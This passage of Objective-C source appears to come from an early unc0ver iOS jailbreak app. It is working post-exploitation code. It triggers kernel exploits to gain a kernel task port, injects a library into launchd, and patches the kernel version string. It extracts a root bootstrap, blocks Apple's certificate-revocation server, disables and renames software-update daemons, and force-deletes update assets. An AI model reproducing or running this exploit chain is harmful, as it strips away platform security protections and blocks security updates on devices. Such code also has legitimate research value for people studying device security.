            if (!access("/var/log/pspawn_hook_xpcproxy.log", F_OK)) {
                rv = unlink("/var/log/pspawn_hook_xpcproxy.log");
                LOG("rv: " "%d" "\n", rv);
                _assert(rv == 0);
            }
            if (!access("/var/log/pspawn_hook_other.log", F_OK)) {
                rv = unlink("/var/log/pspawn_hook_other.log");
                LOG("rv: " "%d" "\n", rv);
                _assert(rv == 0);
            }
            rv = inject_library(1, "/usr/lib/pspawn_hook.dylib");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        LOG("Successfully patched launchd.");
    }
    
    {
        // Update version string.
        
        LOG("Updating version string...");
        PROGRESS("Exploiting... (40/48)", 0, 0);
        rv = uname(&u);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        for (i = 0; !(i >= 5 || strstr(u.version, DEFAULT_VERSION_STRING)); i++) {
            rv = updateVersionString(DEFAULT_VERSION_STRING, tfp0, kernel_base);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            rv = uname(&u);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        _assert(strstr(u.version, DEFAULT_VERSION_STRING));
        LOG("Successfully updated version string.");
    }
    
    {
        // Extract bootstrap.
        
        LOG("Extracting bootstrap...");
        PROGRESS("Exploiting... (41/48)", 0, 0);
        if (access("/.installed_unc0ver", F_OK)) {
            rv = chdir("/");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            rv = execCommandAndWait("/jb/tar", "--use-compress-program=/jb/lzma", "-xvpkf", "/var/tmp/strap.tar.lzma", NULL, NULL);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 512 || rv == 0);
            rv = _system("/usr/libexec/cydia/firmware.sh");
            LOG("rv: " "%d" "\n", rv);
            rv = WEXITSTATUS(rv);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            rv = _system("/usr/bin/dpkg --configure -a");
            LOG("rv: " "%d" "\n", rv);
            rv = WEXITSTATUS(rv);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 256 || rv == 0);
            a = fopen("/.installed_unc0ver", "w");
            LOG("a: " "%p" "\n", a);
            _assert(a != NULL);
            rv = fclose(a);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            rv = chmod("/.installed_unc0ver", 0644);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            rv = chown("/.installed_unc0ver", 0, 0);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            run_uicache = 1;
        }
        rv = unlink("/jb/tar");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = unlink("/jb/lzma");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = unlink("/var/tmp/strap.tar.lzma");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        if (!access("/usr/bin/debugserver", F_OK)) {
            rv = unlink("/usr/bin/debugserver");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        rv = symlink("/jb/debugserver", "/usr/bin/debugserver");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully extracted bootstrap.");
    }
    
    {
        if (access("/.cydia_no_stash", F_OK)) {
            // Disable stashing.
            
            LOG("Disabling stashing...");
            PROGRESS("Exploiting... (42/48)", 0, 0);
            a = fopen("/.cydia_no_stash", "w");
            LOG("a: " "%p" "\n", a);
            _assert(a != NULL);
            rv = fclose(a);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            rv = chmod("/.cydia_no_stash", 0644);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            rv = chown("/.cydia_no_stash", 0, 0);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            LOG("Successfully disabled stashing.");
        }
    }
    
    {
        if (disable_app_revokes) {
            // Block ocsp.apple.com.
            LOG("Blocking ocsp.apple.com...");
            PROGRESS("Exploiting... (43/48)", 0, 0);
            blockDomainWithName("ocsp.apple.com");
            LOG("Successfully blocked ocsp.apple.com.");
        }
    }
    
    {
        // Allow SpringBoard to show non-default system apps.
        
        LOG("Allowing SpringBoard to show non-default system apps...");
        PROGRESS("Exploiting... (44/48)", 0, 0);
        md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
        _assert(md != nil);
        for (int i = 0; !(i >= 5 || [md[@"SBShowNonDefaultSystemApps"] isEqual:@(YES)]); i++) {
            rv = kill(findPidOfProcess("cfprefsd"), SIGSTOP);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            md[@"SBShowNonDefaultSystemApps"] = @(YES);
            rv = [md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 1);
            rv = kill(findPidOfProcess("cfprefsd"), SIGKILL);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
            _assert(md != nil);
        }
        _assert([md[@"SBShowNonDefaultSystemApps"] isEqual:@(YES)]);
        LOG("Successfully allowed SpringBoard to show non-default system apps.");
    }
    
    {
        if (disable_auto_updates) {
            // Disable Auto Updates.
            
            LOG("Disabling Auto Updates...");
            PROGRESS("Exploiting... (45/48)", 0, 0);
            if (!access("/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist", F_OK)) {
                rv = execCommandAndWait("/bin/launchctl", "unload", "/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist", NULL, NULL, NULL);
                LOG("rv: " "%d" "\n", rv);
                _assert(rv == 0);
                rv = rename("/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist", "/System/Library/com.apple.mobile.softwareupdated.plist");
                LOG("rv: " "%d" "\n", rv);
                _assert(rv == 0);
            }
            if (!access("/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist", F_OK)) {
                rv = execCommandAndWait("/bin/launchctl", "unload", "/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist", NULL, NULL, NULL);
                LOG("rv: " "%d" "\n", rv);
                _assert(rv == 0);
                rv = rename("/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist", "/System/Library/com.apple.softwareupdateservicesd.plist");
                LOG("rv: " "%d" "\n", rv);
                _assert(rv == 0);
            }
            if (!access("/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/Support/softwareupdated", F_OK)) {
                rv = rename("/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/Support/softwareupdated", "/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/softwareupdated");
                LOG("rv: " "%d" "\n", rv);
                _assert(rv == 0);
            }
            if (!access("/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/Support/softwareupdateservicesd", F_OK)) {
                rv = rename("/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/Support/softwareupdateservicesd", "/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/softwareupdateservicesd");
                LOG("rv: " "%d" "\n", rv);
                _assert(rv == 0);
            }
            if (findPidOfProcess("softwareupdated")) {
                rv = kill(findPidOfProcess("softwareupdated"), SIGKILL);
                LOG("rv: " "%d" "\n", rv);
                _assert(rv == 0);
            }
            if (findPidOfProcess("softwareupdateservicesd")) {
                rv = kill(findPidOfProcess("softwareupdateservicesd"), SIGKILL);
                LOG("rv: " "%d" "\n", rv);
                _assert(rv == 0);
            }
            rv = execCommandAndWait("/bin/rm", "-rf", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation/*", NULL, NULL, NULL);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            rv = execCommandAndWait("/bin/rm", "-rf", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate/*", NULL, NULL, NULL);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            LOG("Successfully disabled Auto Updates.");
        }
    }
    
    {
        if (load_daemons) {
            // Load Daemons.
            
            LOG("Loading Daemons...");
            PROGRESS("Exploiting... (46/48)", 0, 0);
            _system("echo 'really jailbroken'; shopt -s nullglob; for a in /Library/LaunchDaemons/*.plist; do echo loading $a; launchctl load \"$a\" ; done; for file in /etc/rc.d/*; do if [[ -x \"$file\" ]]; then \"$file\"; fi; done");
            sleep(2);
            LOG("Successfully loaded Daemons.");
        }
    }
    
    {
        if (run_uicache) {
            // Run uicache.
            
            LOG("Running uicache...");
            PROGRESS("Exploiting... (47/48)", 0, 0);
            rv = execCommandAndWait("/usr/bin/uicache", NULL, NULL, NULL, NULL, NULL);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            LOG("Successfully ran uicache.");
        }
    }
    
    {
        if (load_tweaks) {
            // Load Tweaks.
            
            LOG("Loading Tweaks...");
            PROGRESS("Exploiting... (48/48)", 0, 0);
            rv = execCommandAndWait("/usr/bin/ldrestart", NULL, NULL, NULL, NULL, NULL);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            LOG("Successfully loaded Tweaks.");
        }
    }
}

- (IBAction)tappedOnJailbreak:(id)sender
{
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0ul), ^{
        struct utsname u = { 0 };
        uname(&u);
        if (strstr(u.version, DEFAULT_VERSION_STRING)) {
            PROGRESS("Jailbroken", 0, 1);
            return;
        } else if (![[SettingsTableViewController supportedBuilds] containsObject:[[NSMutableDictionary alloc] initWithContentsOfFile:@"/System/Library/CoreServices/SystemVersion.plist"][@"ProductBuildVersion"]]) {
            PROGRESS("Unsupported", 0, 0);
        }
        // Initialize kernel exploit.
        LOG("Initializing kernel exploit...");
        PROGRESS("Exploiting... (1/48)", 0, 0);
        switch ([[NSUserDefaults standardUserDefaults] integerForKey:@K_EXPLOIT]) {
            case 0: {
                vfs_sploit();
                break;
            }
            
            case 1: {
                mptcp_go();
                break;
            }
            case 2: {
                async_wake_go();
                break;
            }
                
            default: {
                break;
            }
        }
        // Validate TFP0.
        LOG("Validating TFP0...");
        if (!(MACH_PORT_VALID(tfp0))) {
            PROGRESS("Failed, reboot", 0, 0);
            return;
        }
        LOG("Successfully validated TFP0.");
        // NOTICE("Jailbreak succeeded, but still needs a few minutes to respring.", 0);
        exploit(tfp0, (uint64_t)get_kernel_base(tfp0),[[NSUserDefaults standardUserDefaults] boolForKey:@K_TWEAK_INJECTION], [[NSUserDefaults standardUserDefaults] boolForKey:@K_LOAD_DAEMONS], [[NSUserDefaults standardUserDefaults] boolForKey:@K_DUMP_APTICKET], [[NSUserDefaults standardUserDefaults] boolForKey:@K_REFRESH_ICON_CACHE], strdup([[[NSUserDefaults standardUserDefaults] objectForKey:@K_BOOT_NONCE] UTF8String]), [[NSUserDefaults standardUserDefaults] boolForKey:@K_DISABLE_AUTO_UPDATES], [[NSUserDefaults standardUserDefaults] boolForKey:@K_DISABLE_APP_REVOKES], [[NSUserDefaults standardUserDefaults] boolForKey:@K_OVERWRITE_BOOT_NONCE], [[NSUserDefaults standardUserDefaults] boolForKey:@K_EXPORT_KERNEL_TASK_PORT], [[NSUserDefaults standardUserDefaults] boolForKey:@K_RESTORE_ROOTFS]);
        PROGRESS("Jailbroken", 0, 1);
    });
}

+ (NSURL *)getURLForUserName:(NSString *)userName {
    if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"tweetbot://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"tweetbot:///user_profile/%@", userName]];
    } else if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"twitterrific://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"twitterrific:///profile?screen_name=%@", userName]];
    } else if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"tweetings://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"tweetings:///user?screen_name=%@", userName]];
    } else if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"twitter://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"https://mobile.twitter.com/%@", userName]];
    } else {
        return [NSURL URLWithString:[NSString stringWithFormat:@"https://mobile.twitter.com/%@", userName]];
    }
}

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
    sharedController = self;
    struct utsname u = { 0 };
    uname(&u);
    if (strstr(u.version, DEFAULT_VERSION_STRING)) {
        PROGRESS("Jailbroken", 0, 1);
    } else if (![[SettingsTableViewController supportedBuilds] containsObject:[[NSMutableDictionary alloc] initWithContentsOfFile:@"/System/Library/CoreServices/SystemVersion.plist"][@"ProductBuildVersion"]]) {
        PROGRESS("Unsupported", 0, 0);
    }
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

- (UIStatusBarStyle)preferredStatusBarStyle {
    return UIStatusBarStyleDefault;
}

- (IBAction)tappedOnPwn:(id)sender{
    [[UIApplication sharedApplication] openURL:[ViewController getURLForUserName:@"Pwn20wnd"] options:@{} completionHandler:nil];
}

- (IBAction)tappedOnDennis:(id)sender{
    [[UIApplication sharedApplication] openURL:[ViewController getURLForUserName:@"DennisBednarz"] options:@{} completionHandler:nil];
}

- (IBAction)tappedOnSamB:(id)sender{
    [[UIApplication sharedApplication] openURL:[ViewController getURLForUserName:@"sbingner"] options:@{} completionHandler:nil];
}

- (IBAction)tappedOnSamG:(id)sender{
    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"https://reddit.com/u/Samg_is_a_Ninja"] options:@{} completionHandler:nil];
}

// This intentionally returns nil if called before it's been created by a proper init
+(ViewController*)sharedController {
    return sharedController;
}

- (id)initWithCoder:(NSCoder *)aDecoder {
    NSLog(@"initWithCoder called");
    @synchronized(sharedController) {
        if (sharedController == nil) {
            sharedController = [super initWithCoder:aDecoder];
        }
    }
    self = sharedController;
    return self;
}

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil {
    @synchronized(sharedController) {
        if (sharedController == nil) {
            sharedController = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
        }
    }
    self = sharedController;
    return self;
}

- (id)init {
    @synchronized(sharedController) {
        if (sharedController == nil) {
            sharedController = [super init];
        }
    }
    self = sharedController;
    return self;
}

@end
